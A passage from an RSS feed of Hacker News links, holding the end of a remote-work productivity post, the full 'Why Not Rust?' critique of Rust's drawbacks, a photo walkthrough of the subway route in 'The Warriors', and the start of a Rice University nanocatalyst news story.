- <span>[</span> <span>]</span> Pass grammarly <span>in </span>the <span>test </span>spec
- <span>[</span> <span>]</span> Revisit variables and methods names
- <span>[</span> <span>]</span> Check every public method doc
- <span>[</span> <span>]</span> Check API docs
- <span>[</span> <span>]</span> Smoke <span>test </span>everyting
- <span>[</span> <span>]</span> Improvement
</code></pre></div></div>

<h3 id="address-daily-meetings-like-a-diary">Address daily meetings like a diary</h3>

<p>Some people think that daily meetings are boring, but I think they can and should be fun and productive. I write my daily meeting notes every day as if I were keeping a diary, telling a short story about yesterday and this morning, as well as what I plan to do today and whether the plan for the week needs to change. I usually start working 4 hours before the next member of my team wakes up (I work from Brazil with a team located in the USA), so I write the notes of the daily meetings between 2 and 3 hours after starting work, which helps me to clarify how my day was yesterday, what should I keep doing, what should I avoid and what is blocking.</p>

<p>Also, the notes will give you a direct message to say at daily meetings, and I avoid starting the meeting by saying, “Let me remember what I did yesterday !!!” you will look professional, having the updates you need to provide at your fingertips. It also gives you a sense of how things are going over the days; you can look back at your daily notes and see if you’re making progress or not.</p>

<p>The time tracker is your ally when taking notes; this will help you not to forget any details, even if you take notes 3 days later, on a Monday. After a while, it will be natural, and you will not need to remember to do them, to start this habit, I recommend adding a task in your agenda 1 hour before the daily meeting to make notes this way once in the daily meeting begins you will be ready.</p>

<h3 id="tools-you-should-use">Tools you should use</h3>

<h4 id="1-grammarly">1. <a href="https://www.grammarly.com/">Grammarly</a></h4>

<p>Grammarly, for me, is one of the most essential tools for my day-to-day, whether as my text editor or email corrector. Writing for me is a superpower for remote workers and we have to make sure our text is reasonable; you do not need to proofread every single document you produce but it helps you not having any typos or structural problems. I do overuse Grammarly, and it has paid dividends for the last three years. Since I started my master’s degree, I had it verifying every single article and master thesis. Since then, I use to say it is the best investment I do every year.</p>

<h4 id="2-time-tracker">2. Time tracker</h4>

<p>Time tracking is a superpower that will enable you to see where you are putting your time on, even if your employer does not require it, I would recommend you to have one for many reasons.</p>
<ul>
  <li>You will where you are spending most of your time in.</li>
  <li>You can avoid overworking by knowing how many hours you worked on that day and not trusting your sense of “have I worked too much or too few?”</li>
</ul>

<p>Today I use <a href="https://www.getharvest.com/">Harvest</a> but in the past, while working as independet contractor I have used <a href="http://toggl.com/">Toggl</a>, and I track my activities in real time, without caring about all about details (Like I will not stop the clock if I go out to grap coffee or to read email), but I would recommend using any if them that you like using.</p>

<h4 id="3-skitch">3. <a href="https://evernote.com/products/skitch">Skitch</a></h4>

<p>One picture worths a thousand words, but it needs to be good, because sometimes you need to explain complex subjects to people that will not have the same context you have about the topic you are talking about. In that matter, Skitch is a great tool to take prints and show critical points and do short explanations. Check out the next image, where I was explaining a chart just as an example.</p>

<p><img width="1849" alt="Grafana_-_Nun-Db_Monitoring" src="https://user-images.githubusercontent.com/234049/93271844-9d032d00-f78a-11ea-9e1c-922578623c36.png"></p>

<h4 id="4-obs-screen-recording">4. <a href="https://obsproject.com/">OBS</a> (screen recording)</h4>

<p>As well as writing, showing information as video can be a superpower. Some subjects are much easier to demonstrate as a video than as a text. For example, simulating a bug or showing a problem needs to touch several services and multiple monitoring charts and sources.
Recording a good video showing how you find the bug, how you made sure it was fixed, or even explaining the process you have implemented can save you several paragraphs of text, and save you from having a PR rejected. Any complex new feature or bug fix, I would advise you to come with an excellent text in the PR, great code comments, great self-review showing the critical areas, and a good video explaining …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mateusfreira.github.io/@mateusfreira-secrets-to-becoming-a-better-remote-developer/">https://mateusfreira.github.io/@mateusfreira-secrets-to-becoming-a-better-remote-developer/</a></em></p>]]>
            </description>
            <link>https://mateusfreira.github.io/@mateusfreira-secrets-to-becoming-a-better-remote-developer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536775</guid>
            <pubDate>Sun, 20 Sep 2020 19:44:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Rust?]]>
            </title>
            <description>
<![CDATA[
Score 305 | Comments 317 (<a href="https://news.ycombinator.com/item?id=24536645">thread link</a>) | @dochtman
<br/>
September 20, 2020 | https://matklad.github.io/2020/09/20/why-not-rust.html | <a href="https://web.archive.org/web/*/https://matklad.github.io/2020/09/20/why-not-rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Sep 20, 2020</p>
  <p>I’ve recently read an article criticizing Rust, and, while it made a bunch of good points, I didn’t enjoy it — it was an easy to argue with piece.
In general, I feel that I can’t recommend an article criticizing Rust.
This is a shame — confronting drawbacks is important, and debunking low effort/miss informed attempts at critique sadly inoculates against actually good arguments.</p>
<p>So, here’s my attempt to argue <em>against</em> Rust:</p>
<div>
<dl>
<dt>Not All Programming is Systems Programming</dt>
<dd>
<div>
<div>
<p>Rust is a systems programming language.
It offers precise control over data layout and runtime behavior of the code, granting  you maximal performance and flexibility.
Unlike other systems programming languages, it also provides memory safety — buggy programs terminate in a well-defined manner, instead of unleashing (potentially security-sensitive) undefined behavior.</p>
<p>However, in many (most) cases, one doesn’t need ultimate performance or control over hardware resources.
For these situations, modern managed languages like Kotlin or Go offer decent speed, enviable
<a href="https://qconlondon.com/london-2017/system/files/presentation-slides/highperformancemanagedlanguages.pdf">time to performance</a>, and are memory safe by virtue of using a garbage collector for dynamic memory management.</p>
</div>
</div>
</dd>
<dt>Complexity</dt>
<dd>
<div>
<div>
<p>Programmer’s time is valuable, and, if you pick Rust, expect to spend some of it on learning the ropes.
Rust community poured a lot of time into creating high-quality teaching materials, but the Rust language <em>is</em> big.
Even if a Rust implementation would provide value for you, you might not have resources to invest into growing the language expertise.</p>
<p>Rust’s price for improved control is the curse of choice:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Bar</span>         <span>}</span>
<span>struct</span> <span>Foo</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span> <span>bar</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Bar</span>     <span>}</span>
<span>struct</span> <span>Foo</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span> <span>bar</span><span>:</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>Bar</span> <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Box</span><span>&lt;</span><span>Bar</span><span>&gt;</span>    <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Rc</span><span>&lt;</span><span>Bar</span><span>&gt;</span>     <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Arc</span><span>&lt;</span><span>Bar</span><span>&gt;</span>    <span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In Kotlin, you write <code>class Foo(val bar: Bar)</code>, and proceed with solving your business problem.
In Rust, there are choices to be made, some important enough to have dedicated syntax.</p>
<p>All this complexity is there for a reason — we don’t know how to create a simpler memory safe low-level language.
But not every task requires a low-level language to solve it.</p>

</div>
</div>
</dd>
<dt>Compile Times</dt>
<dd>
<div>
<div>
<p>Compile times are a multiplier for everything.
A program written in a slower to run but faster to compile programming language can be <em>faster</em> to run because the programmer will have more time to optimize!</p>
<p>Rust intentionally picked slow compilers in the <a href="https://research.swtch.com/generic">generics dilemma</a>.
This is not necessary the end of the world (the resulting runtime performance improvements are real), but it does mean that you’ll have to fight tooth and nail for reasonable build times in larger projects.</p>
<p><code>rustc</code> implements what is probably the most advanced <a href="https://rustc-dev-guide.rust-lang.org/queries/incremental-compilation.html">incremental compilation</a> algorithm in production compilers, but this feels a bit like fighting with language compilation model.</p>
<p>Unlike C++, Rust build is not embarrassingly parallel; the amount of parallelism is limited by length of the critical path in the dependency graph.
If you have 40+ cores to compile, this shows.</p>
<p>Rust also lacks an analog for the <a href="https://en.cppreference.com/w/cpp/language/pimpl">pimpl</a> idiom, which means that changing a crate requires recompiling (and not just relinking) all of its reverse dependencies.</p>
</div>
</div>
</dd>
<dt>Maturity</dt>
<dd>
<div>
<div>
<p>Five years old, Rust is definitely a young language.
Even though its future looks bright, I will bet more money on “C will be around in ten years” than on “Rust will be around in ten years”
(See <a href="https://en.wikipedia.org/wiki/Lindy_effect">Lindy Effect</a>).
If you are writing software to last decades, you should seriously consider risks associated with picking new technologies.
(But keep in mind that picking Java over Cobol for banking software in 90s retrospectively turned out to be the right choice).</p>
<p>There’s only one complete implementation of Rust — the <a href="https://github.com/rust-lang/rust/"><code>rustc</code></a> compiler.
The most advanced alternative implementation, <a href="https://github.com/thepowersgang/mrustc"><code>mrustc</code></a>, purposefully omits many static safety checks.
<code>rustc</code> at the moment supports only a single production-ready backend — LLVM.
Hence, its support for CPU architectures is narrower than that of C, which has GCC implementation as well as a number of vendor specific proprietary compilers.</p>
<p>Finally, Rust lacks an official specification.
<a href="https://doc.rust-lang.org/reference/">The reference</a> is a work in progress, and does not yet document all the fine implementation details.</p>
</div>
</div>
</dd>
<dt>Alternatives</dt>
<dd>
<div>
<div>
<p>There are other languages besides Rust in systems programming space, notably, C, C++, and Ada.</p>
<p>Modern C++ provides <a href="https://www.viva64.com/en/pvs-studio/">tools</a> and <a href="https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines">guidelines</a> for improving safety.
There’s even a proposal for a Rust-like <a href="https://github.com/isocpp/CppCoreGuidelines/blob/master/docs/Lifetime.pdf">lifetimes</a> mechanism!
Unlike Rust, using these tools does not <em>guarantee</em> the absence of memory safety issues.
However, if you already maintain a large body of C++ code, it makes sense to check if following best practices and using <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">sanitizers</a> helps with security issues.
This is hard, but clearly is easier than rewriting in another language!</p>
<p>If you use C, you can use formal methods to <a href="https://sel4.systems/Info/FAQ/proof.pml">prove</a> the absence of undefined behaviors, or just <a href="https://sqlite.org/testing.html">exhaustively test</a> everything.</p>
<p>Ada is memory safe if you don’t use dynamic memory (never call <code>free</code>).</p>
<p>Rust is an interesting point on the cost/safety curve, but is far from the only one!</p>
</div>
</div>
</dd>
<dt>Tooling</dt>
<dd>
<div>
<div>
<p>Rust tooling is a bit of a hit and miss.
The baseline tooling, the compiler and the build system
(<a href="https://doc.rust-lang.org/cargo/index.html">cargo</a>), are often cited as best in class.</p>
<p>But, for example, some runtime-related tools (most notably, heap profiling) are just absent — it’s hard to reflect on the runtime of the program if there’s no runtime!
Additionally, while IDE support is decent, it is nowhere near the Java-level of reliability.
Automated complex refactors of multi-million line programs are not possible in Rust today.</p>
</div>
</div>
</dd>
<dt>Integration</dt>
<dd>
<div>
<div>
<p>Whatever the Rust promise is, it’s a fact of life that today’s systems programming world speaks C, and is inhabited by C and C++.
Rust intentionally doesn’t try to mimic these languages — it doesn’t use C++-style classes or C ABI.</p>
<p>That means that integration between the worlds needs explicit bridges.
These are not seamless.
They are <code>unsafe</code>, not always completely zero-cost and need to be synchronized between the languages.
While the general promise of <a href="http://adventures.michaelfbryan.com/posts/how-to-riir/">piece-wise integration</a> holds up and the <a href="https://github.com/dtolnay/cxx">tooling</a> catches up, there is accidental complexity along the way.</p>
<p>One specific gotcha is that Cargo’s opinionated world view (which <em>is</em> a blessing for pure Rust projects) might make it harder to integrate with a bigger build system.</p>
</div>
</div>
</dd>
<dt>Performance</dt>
<dd>
<div>
<div>
<p>“Using LLVM” is not a universal solution to all performance problems.
While I am not aware of benchmarks comparing performance of C++ and Rust at scale, it’s not to hard to come up with a list of cases where Rust leaves some performance on the table relative to C++.</p>
<p>The biggest one is probably the fact that Rust’s move semantics is based on values (<code>memcpy</code> at the machine code level).
In contrast, C++ semantics uses special references you can steal data from (pointers at the machine code level).
In theory, compiler should be able to see through chain of copies; in practice it often doesn’t: <a href="https://github.com/rust-lang/rust/issues/57077">#57077</a>.
A related problem is the absence of placement new — Rust sometimes need to copy bytes to/from the stack, while C++ can construct the thing in place.</p>
<p>Somewhat amusingly, Rust’s default ABI (which is not stable, to make it as efficient as possible) is sometimes worse than that of C: <a href="https://github.com/rust-lang/rust/issues/26494#issuecomment-619506345">#26494</a>.</p>
<p>Finally, while in theory Rust code should be more efficient due to the significantly richer aliasing information, enabling aliasing-related optimizations triggers LLVM bugs and miscompilations: <a href="https://github.com/rust-lang/rust/issues/54878">#54878</a>.</p>
<p>But, to reiterate, these are cherry-picked examples, sometimes the field is tilted the other way.
For example, <code>std::unique_ptr</code> <a href="https://www.youtube.com/watch?v=rHIkrotSwcc&amp;feature=youtu.be&amp;t=1261">has a performance problem</a> which Rust’s <code>Box</code> lacks.</p>
<p>A potentially bigger issue is that Rust, with its definition time checked generics, is less expressive than C++.
So, some C++ <a href="http://eigen.tuxfamily.org/index.php?title=Expression_templates">template tricks</a> for high performance are not expressible in Rust using a nice syntax.</p>
</div>
</div>
</dd>
<dt>Meaning of Unsafe</dt>
<dd>
<div>
<div>
<p>An idea which is even more core to Rust than ownership &amp; borrowing is perhaps that of <code>unsafe</code> boundary.
That, by delineating all dangerous operations behind <code>unsafe</code> blocks and functions and insisting on providing a safe higher-level interface to them, it is possible to create a system which is both</p>
<div>
<ol>
<li>
<p>sound (non-<code>unsafe</code> code can’t cause undefined behavior),</p>
</li>
<li>
<p>and modular (different <code>unsafe</code> blocks can be checked separately).</p>
</li>
</ol>
</div>
<p>It’s pretty clear that the promise works out in practice: <a href="https://github.com/rust-fuzz/trophy-case">fuzzing Rust code</a> unearths panics, not buffer overruns.</p>
<p>But the theoretical outlook is not as rosy.</p>
<p><em>First</em>, there’s no definition of Rust memory model, so it is impossible to formally check if a given unsafe block is valid or not.
There’s informal definition of “things rustc does or might rely on” and in in-progress <a href="https://github.com/rust-lang/miri">runtime verifier</a>, but the actual model is in flux.
So there might be some <code>unsafe</code> code somewhere which works OK in practice today, might be declared invalid tomorrow, and broken by a new compiler optimization next year.</p>
<p><em>Second</em>, there’s also an observation that <code>unsafe</code> blocks are not, in fact, modular.
Sufficiently powerful <code>unsafe</code> blocks can, in effect, extend the language.
Two such extensions might be fine in isolation, but lead to undefined behavior if used simultaneously:
<a href="https://smallcultfollowing.com/babysteps/blog/2016/10/02/observational-equivalence-and-unsafe-code/">Observational equivalence and unsafe code</a>.</p>

</div>
</div>
</dd>
</dl>
</div>
<p>Here are some thing I’ve deliberately omitted from the list:</p>
<div>
<ul>
<li>
<p>Economics (“it’s harder to hire Rust programmers”) — I feel that the “maturity” section captures the essence of it which is not reducible to chicken and egg problem.</p>
</li>
<li>
<p>Dependencies (“stdlib is too small / everything has too many deps”) — given how good Cargo and the relevant parts of the language are, I personally don’t see this as a problem.</p>
</li>
<li>
<p>Dynamic linking (“Rust should have stable ABI”) — I don’t think this is a strong argument. Monomorphization is pretty fundamentally incompatible with dynamic linking and there’s C ABI if you really need to. I do think that the situation here can be improved, <a href="https://internals.rust-lang.org/t/a-stable-modular-abi-for-rust/12347/10?u=matklad">but I don’t think that improvement needs to be Rust-specific</a>.</p>
</li>
</ul>
</div>

</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io/2020/09/20/why-not-rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536645</guid>
            <pubDate>Sun, 20 Sep 2020 19:27:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracing the NYC Trip in “The Warriors” (2006)]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24536427">thread link</a>) | @keiferski
<br/>
September 20, 2020 | http://www.stonegreasers.com/greaser/conclay.html | <a href="https://web.archive.org/web/*/http://www.stonegreasers.com/greaser/conclay.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="centernote"> 	
		<h3>Coney Island to The Bronx</h3>  
  		<p>"The Warriors" Movie: In 1979, the Street Gang the Coney Island Warriors made their Famous Trip - From Coney Island to Dyre Avenue/Eastchester in the Bronx - which would Change Their Lives Forever!. March 27, 2006, I Documented their Legendary Trip. "<em>It's still on, and we're going. Cyrus sent an emissary this afternoon to make sure. Cyrus don't want anybody packed or anybody flexing any muscle. So I gave him my word that the Warriors would uphold the truce. Everybody says that Cyrus is the one and only. I think we'd better go have a look for ourself</em>."</p>
		
<div><p><img src="http://www.stonegreasers.com/greaser/coney_station.jpg" alt="Its still and were going! Stillwells and Ocean Avenue Subway Station"> From Stillwells and Ocean Avenue, you take the Q Train to Union Square, that is where you catch the Number 5 Bronx train to Eastchester. 
		</p><p><span>"We ain't been to the Bronx before!"</span></p><p> <span>"No sweat! This Conclave is going to be a big item, every gang in the city is going to be there!"</span></p></div>

		<h2>The Big CI Coney Island</h2>
		<p><img src="http://www.stonegreasers.com/greaser/coney1.jpg" alt="Coney Island freak show building"><br>
      		<img src="http://www.stonegreasers.com/greaser/coney2.jpg" alt="Coney Island Neighborhood to the west from station">	
                <img src="http://www.stonegreasers.com/greaser/coney3.jpg" alt="Coney Island neighborhood to the North from the station">
      		<span>"We Fought All Night to Get Back to this?"</span></p>     	
  
    		<h2>Wonderwheel, The Cyclone, and the Observation Tower</h2>
		<div><p><img src="http://www.stonegreasers.com/greaser/q_train1.jpg" alt="From the Q Train, Coney Island and the Ocean">Q Train leaving Stillwells Station, you can see the world famous Cyclone Roller Coaster, the observation tower, the Wonderwheel, and the Ocean in the background. </p><p><span>"Were goin in there with nothing! Were goin in their like everybody else - nine guys, no weapons!"</span></p></div>
    
		<h4>At the Q line curve (East 16th Street) - Taggings on Buildings</h4>

         	<div><p><img src="http://www.stonegreasers.com/greaser/q_train2.jpg" alt="Around the curve, gang taggings on the buildings.">      The Q Train runs along Ocean Parkway, curves and heads up East 16th Street until it hits Prospect Park and runs along Flatbush Avenue.</p><p><span>"What do you know about Cyrus? He's the One and Only!" </span></p></div>
    
    		<h4>Union Square - 14th Street Station - Little Break in the Action</h4>
		<div><p><img src="http://www.stonegreasers.com/greaser/Union_sq.jpg" alt="Break in the action - the Gray Mime at Union Square">On my way down the ramp to pick up the Number 5 Bronx bound Lexington, I did not get delayed by the Punks or the Baseball Furies, but I did run into the Gray Lady Mime.</p><p><span>"You never what you're gonna run into. In our colours, we can't hide."<p>"Who wants to hide?"</p></span></p></div>

          	<h4>42nd Street - Grand Central Station</h4>
        	<div><p><img src="http://www.stonegreasers.com/greaser/lexington1.jpg" alt="The Lexington Number 5 Train"><span>"42nd Street - Next Stop!" </span></p><p>Made it to Grand Central. Now pick up the number 5 Bronx bound train.</p><p><span>"That's our train!" </span></p></div>
      
    		<h4>Lexington Number 5 Sights and Scenes</h4>    
      		<p><img src="http://www.stonegreasers.com/greaser/morris.jpg" alt="Bronx Morris Station">Morris Park Station - we are in the Bronx.  </p>
		<p><img src="http://www.stonegreasers.com/greaser/prospect.jpg" alt="Prospect Park Subway Station">Passing Prospect Avenue</p>
		<p><img src="http://www.stonegreasers.com/greaser/gunhill.jpg" alt="Gun Hill Subway station">Passing Gun Hill Road </p>
     
   		<h4>Dyre Avenue - Eastchester Final Stop</h4>
		<div><p><img src="http://www.stonegreasers.com/greaser/dyre.jpg" alt="Dyre Road Subway station">We made it! Dyre Avenue Station, the last stop on the Number 5. Now to make it to the Conclave to meet Cyrus.</p><p>Standing on the station platform, you can imagine the various gangs coming into the station and heading down the steps on their way to the Conclave.</p></div>
     
    		<h4>Scenes of the Dyre Avenue Hood</h4>
   		<p><img src="http://www.stonegreasers.com/greaser/dyre_station_3.jpg" alt="Dyre Road/Eastchester Subway Station">Eastchester Station </p>
          	<p><img src="http://www.stonegreasers.com/greaser/dyre_station_2.jpg" alt="Dyre Road Station - different angle photo">Not much in the way of a cemetery in the area, as I walked around looking for the Conclave. Today, the area seems to be desserted, or just a commuter stop. </p>
		<div><p><img src="http://www.stonegreasers.com/greaser/dyre_station_4.jpg" alt="Syre Road Subway station from a different angle">Picture taken from the Dyre Avenue Station platform.</p><p>Reminds me of the neighborhood the Orphans were from.</p></div>
     
    		<h4>Number 4 (Muggers' Express) Woodlawn Station</h4>
  		<p><img src="http://www.stonegreasers.com/greaser/woodlawn1.jpg" alt="Woodlawn Subway Station and Cementary">You have to wonder if the producer of the Warriors wanted us to imagine where the location of the Conclave was really at, because it seems like the Woodlawn line (aka. Muggers' Express), Route 4, would have been a better choice since across the street from the Woodlawn Station is the famous Civil War era Woodlawn Cemetery? </p>
  
		<h3>Retracing The Warriors By Subway Lines</h3> 
<ul>
<li>Looking at the MTA Subway Map, and considering that the map in the movie showed them taking the Number 5 Train to Eastchester, I would have to assume after the Warriors were chased by the Turnbull A.C's, they rode the Number 5 down as far as Morris Park before they were detoured by the subway line fire. That way they could walk to the Pelham Parkway Station and pick up the Number 2 line. If they were able to make it down as far as the 149th Street and Grand Concourse Station, they would be able to run between the B, D, 2, 4, 5, and 6 Lines. I assume that is what the Director wanted us to think. </li>

<li>After watching the Directors-cut DVD, you find that the producer wanted you to come to your own conclusion to the various questions that you have about the famous trip. He gave you the map on where the Warriors arrived, and I think the rest is up to
  	 your imagination on where the following events took place.</li>


<li>The subway map in "The Warriors" movie, showed that the "D", "M", "Q", and "B" trains made the Brighton Beach Coney Island loop. Today, the "B" train stops at Brighton Beach and the "M" train travels on the Fourth Avenue/New Utrecht line. The "Q" Train is the only train that still travels to Coney Island via the Brighton line. The trains that travel to and from Coney Island are the D, F, N, and Q lines. The N and D Trains connect to the number 4, 5, and 6 Bronx bound trains at the Broadway-Lafayette Street Station. The F Train connects to those lines at the Canal Street Station. The Q and the N Trains are the only two trains making the Union Square - 14th Street connection, but the Q train is the only one that swings out towards Brighton Beach from the Stillwell's station like the 1970 Subway map in the movie. The N train also runs through Bay Ridge instead of running either the Culver or Brighton Lines. Like the Fox said to Rembrant, "Nobody can read these maps anyways!"</li>
<li>I could not find Cyrus, the Turnbull A.C's, the Rogues, or the rest of the gangs at either location, but I wanted everyone to know - The Gaylords were there! <a href="http://www.stonegreasers.com/greaser/lords_of_kilbourn.html">"Lords of Kilbourn"</a></li>
<li><a href="http://www.scoutingny.com/the-new-york-city-filming-locations-of-the-warriors-ny-youve-changed/">New York City Filming Location for The Warriors</a> - Great website that takes you through the filming loacations in the movie.</li>
</ul>



        </div></div>]]>
            </description>
            <link>http://www.stonegreasers.com/greaser/conclay.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24536427</guid>
            <pubDate>Sun, 20 Sep 2020 19:03:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Octopods: Shape matters for light-activated nanocatalysts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24536394">thread link</a>) | @finphil
<br/>
September 20, 2020 | https://nuadox.com/post/629803542619799552/octopods-nanocatalysts | <a href="https://web.archive.org/web/*/https://nuadox.com/post/629803542619799552/octopods-nanocatalysts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="629803542619799552">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/629803542619799552/octopods-nanocatalysts"><h2>Octopods:&nbsp;Shape matters for light-activated nanocatalysts</h2></a>
                                <figure data-orig-width="1800" data-orig-height="1200"><img src="https://64.media.tumblr.com/61f770ac6dbb075d4c46dddf67290c00/40946e0589ad0ccd-3d/s1280x1920/b0d1a3556e40d1eafe7b8793a38ee67149a7d702.jpg" alt="image" data-orig-width="1800" data-orig-height="1200" width="1280" height="853"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnews.rice.edu%2Fauthor%2Fjadeboyd%2F&amp;t=Nzk0ZDE4NWE0NmM0M2ZkNWVhNTlhNDU3ZTc1NThmNTY0YTk2MWEwNyxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Jade Boyd</a> , <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.rice.edu%2F&amp;t=MDVjYmQ1YmFiNDgzNTM3NTVhY2M1Y2Y1NTk0ZDNiZWNhOTM2MzhkZCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Rice University</a> -</b></p><p>

Points matter when designing nanoparticles that drive important chemical reactions using the power of light. Researchers at Rice University’s <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Flanp.blogs.rice.edu%2F&amp;t=MzU5ODBjNmQwNzc3ODg0ZDRmNDFiYmM5ZTc2NTJlYTY4ZWMyMzRmMCxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Laboratory for Nanophotonics</a> (LANP) have <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.rice.edu%2F2006%2F03%2F14%2Frice-university-researchers-create-nanorice%2F&amp;t=OTQyOGRiYmQyODJlNGQ3NDY4Yzg4YmFlNWM1MjczNWViNTNkYmYyYSxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">long known</a> that a nanoparticle’s shape affects how it interacts with light, and their <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdx.doi.org%2F10.1021%2Facsnano.0c05383&amp;t=YmM0ZWMwYTQ0N2IwZGU3MzgwMmRkYjFmNDViNzJiNTZkNDE0NTNkYSxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">latest study</a> shows how shape affects a particle’s ability to use light to catalyze important chemical reactions.</p><p>In a comparative study, LANP graduate students Lin Yuan and Minhan Lou and their colleagues studied aluminum nanoparticles with identical optical properties but different shapes. The most rounded had 14 sides and 24 blunt points. Another was cube-shaped, with six sides and eight 90-degree corners. The third, which the team dubbed “octopod,” also had six sides, but each of its eight corners ended in a pointed tip.</p><p>All three varieties have the ability to capture energy from light and release it periodically in the form of super-energetic <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.rice.edu%2F2015%2F07%2F22%2Frice-finding-could-lead-to-cheap-efficient-metal-based-solar-cells%2F&amp;t=ZTg3ZGRhOTdhNWY4YmNjYzMwNTU0NWViZDU4YzE3NDNhNjkwMWRmNixUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">hot electrons</a> that can speed up catalytic reactions. Yuan, a chemist in the research group of LANP director <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fprofiles.rice.edu%2Ffaculty%2Fnaomi-j-halas&amp;t=MjczZTdlNjM1ZTliNTI5NmI3YzA3MWExNzE4MjUyODhjYzdjMmY4NSxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">Naomi Halas</a>, conducted experiments to see how well each of the particles performed as photocatalysts for hydrogen dissociation reaction. The tests showed octopods had a 10 times higher reaction rate than the 14-sided nanocrystals and five times higher than the nanocubes. Octopods also had a lower apparent <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.khanacademy.org%2Fscience%2Fhigh-school-biology%2Fhs-energy-and-transport%2Fhs-enzymes%2Fa%2Factivation-energy&amp;t=YWQ0N2MwZGY4MWY3ZWEwOWNmMzU5ZjI0ZmU2ZjdhMjFmZTZkNjNjMSxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726">activation energy</a>, about 45% lower than nanocubes and 49% lower than nanocrystals.</p><p>“The experiments demonstrated that sharper corners increased efficiencies,” said Yuan, co-lead author of the study, which is published in the American Chemical Society journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpubs.acs.org%2Fjournal%2Fancac3&amp;t=MmI4NTFkYWI3MmViZmJiZTM2MTNiMzEzMjc1YzNkM2Y3OWY4YzE2NyxUdllIZnBneA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629803542619799552%2Foctopods-nanocatalysts&amp;m=0&amp;ts=1600892726"><i>ACS Nano</i></a>. “For the octopods, the angle of the corners is about 60 degrees, compared to 90 degrees for the cubes and more rounded points on the nanocrystals. So the smaller the angle, the greater the increase in reaction efficiencies. But how small the angle can be is limited by chemical synthesis. These are single crystals that prefer certain structures. You cannot make infinitely more sharpness.”</p><p>Lou, a physicist and study co-lead author in the research group of LANP’s <a 